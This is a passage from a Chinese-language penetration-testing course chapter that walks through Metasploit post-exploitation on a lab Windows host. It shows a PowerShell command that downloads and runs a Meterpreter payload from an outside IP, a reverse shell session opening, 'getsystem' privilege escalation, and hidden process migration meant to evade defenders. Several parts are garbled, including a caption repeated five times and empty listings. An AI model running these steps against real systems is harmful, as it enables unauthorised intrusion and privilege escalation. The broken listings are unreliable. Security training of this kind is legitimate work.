
```
C:\Users\dave powershell
powershell
Windows PowerShell
Copyright (C) 1998-2016 Microsoft Corporation. All rights reserved.

安装最新版本的 PowerShell 以获取新功能和改进！
https://aka.ms/PSWindows

PS C:\Users\dave> iwr -uri http://192.168.119.2/met.exe -Outfile met.exe
iwr -uri http://192.168.119.2/met.exe -Outfile met.exe

PS C:\Users\dave> .met.exe
\.met.exe

PS C:\Users\dave>
```

### 列表 673 - 连接到 CLIENTWK220 以下载后执行 met.exe

- 一旦执行 Windows 二进制文件，Metasploit 会通知我们打开了一个新会话。

[*] Started HTTPS reverse handler on //192.168.119.4:4443

[*] https://192.168.119.4:4443 handling request from 192.168.119.50:223; (UUID: 4auowcd)

Redirecting stale connection from /tuQIXJFIB-TZCIIOIgGbxevpywKXX1CTUKlb with a Mozilla/5.0 (MacOS; Intel Mac OS X 12.2; rv:97.0) Gecko/20100101 Firefox/97.0/

[*] https://192.168.119.4:4443 handling request from 192.168.119.50:223; (UUID: 4auowcd)

Attaching orphaned/damaged session...

[*] Metpreter session 8 opened (192.168.119.4:4443 -> 127.0.0.1) at 2022-08-04 06:41:29 -0400

### 列表 674 - 来自 met.exe 的入站反 shell shell

```
meterpreter > idletime
User has been idle for: 9 mins 53 secs
```

### 列表 675 - 显示当前用户的 idletime

现在我们已经在 Windows 上有了一个活跃的 Metasploit 会话，可以开始探索后渗透利用命令和功能。

第一个后渗透利用命令是 `idletime`。它显示用户空闲的时间。在获取有关当前用户和操作系统的信息后，这应该是我们的初始命令之一，用于指示目标目前是否正在使用中。

输出显示用户已经 9 分钟 53 秒没有与系统交互，这表明用户可能已经离开了电脑。如果 `idletime` 命令的结果显示用户不在，我们可以以此为机会执行程序或命令，这些程序或可能会短暂地部署一个作为 CMD 或 PowerShell 的命令行窗口。

对于某些后渗透利用功能，我们需要管理员权限来执行它们。Metasploit 包含了 `getsystem`，它会尝试自动将我们的权限提升到 `NT AUTHORITY\SYSTEM`。它使用了多种技术，通过命名管道身份欺骗和令牌复制。在默认设置下，`getsystem` 会执行所有可用技术（如帮助菜单所示），尝试利用 `SeImpersonatePrivilege` 和 `SeDebugPrivilege`。在执行系统命令之前，让我们启动一个交互式 shell 并确认我们的用户是否分配了这两种权限之一。

```
meterpreter > shell
...
C:\Users\luiza> whoami /priv
PRIVILEGES INFORMATION
```

| 权限名称 | 说明 | 状态 |
| --- | --- | --- |
| SeImpersonatePrivilege | 身份验证后冒充客户端身份 | 已启用 |

```
C:\Users\luiza> exit
exit
```

### 列表 676 - 在交互式 shell 中显示分配给用户的权限

el privileges。现在，让我们使用 `getsystem` 来提升我们的权限。

```
meterpreter > getuid
Server username: ITWK01\luiza

meterpreter > getsystem
...
got system via technique 5 (Named Pipe Impersonation variant)
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

### 列表 677 - 使用 getsystem 提升我们的权限

列表 677 显示 `getsystem` 成功地通过命名管道身份欺骗变体将我们的权限提升到 `NT AUTHORITY\SYSTEM`，正如我们手动执行的一样。另一个重要的后渗透利用功能是 `migrate`。如果我们攻了一个主机，我们对机器的访问就会关闭。此外，取决于包含 Meterpreter 负载的 Windows 二进制文件的命名，如果防御者正在搜索进程列表，进程名称可能是可疑的。我们可以使用 `migrate` 将 Meterpreter 负载的执行移动到不同的进程。让我们在 Meterpreter 命令提示符中输入 `ps` 来查看所有运行的进程。

`meterpreter > ps`

| PID | PPID | Name | Arch | Session | User | Path |
| --- | --- | --- | --- | --- | --- | --- |
| | | | | | | |
| 2552 | 8500 | met.exe | x64 | 0 | ITWK01\luiza | C:\Users\luizamet.exe |
| 8052 | 4892 | OneDrive.exe | x64 | 1 | ITWK01\offsec | C:\Users\offsec\OneDrive.exe |

列表 678 显示来自 met.exe 的入站反 shell shell

列表 678 显示来自 met.exe 的入站反 shell shell

列表 678 显示来自 met.exe 的入站反 shell shell

列表 678 显示来自 met.exe 的入站反 shell shell

列表 678 显示来自 met.exe 的入站反 shell shell

### 列表 679 - 迁移到 process.exe

### 列表 680 - 以 offsec 用户身份而非 NT AUTHORITY\SYSTEM 执行命令

与其迁移到现有进程，或者在无法找到任何可以迁移的进程的情况下，我们使用 Meterpreter 命令。该命令提供了通过指定命令或程序来创建新进程的能力。

为了演示这一点，让我们启动 Notepad 进程并以 offsec 用户身份进行迁移。为此，我们使用 `execute` 并配合 `-H` 从隐藏创建进程，并使用 `-f` 参数指定要运行的命令或程序。然后，我们迁移到了新生成的进程。

```
meterpreter > execute -H -f notepad
Process 2720 created.
```

```
meterpreter > migrate 2720
[+] Migrating from 8052 to 2720...
[+] Migration completed successfully.
```

### 列表 681 - 迁移到新生成的进程

列表 681 显示了我们如何迁移到新生成的进程。由于我们使用了 `-H` 选项，notepad 在没有视觉显示的情况下启动。然而，该进程仍然出现在应用程序（如任务管理器）的进程列表中。

## 20.3.2 后执行模块 (Post-Exploitation Modules)

除了 Meterpreter 核心函数的命令和操作外，还有几个后执行模块可以部署到活动会话上。通过诸如客户端攻击创建的会话可能只为我们提供低权限的 shell。但如果目标用户是本地管理员组的成员，如果我们可以绕过用户账户控制 (UAC)，就可以将 shell 提升到高完整性级别。

在上一节中，我们将 Meterpreter 迁移到一个正在运行的（假设是中等完整性的）`OneDrive.exe` 进程。在本节中，让我们重复上一节的步骤并绕过 UAC，在 `ITWK01` 上绑定端口 `4444`，下载并执行 `met.exe`，使用 `getsystem` 提升权限。然后我们使用 `ps` 来识别 `OneDrive.exe` 的进程 ID 并迁移过去。
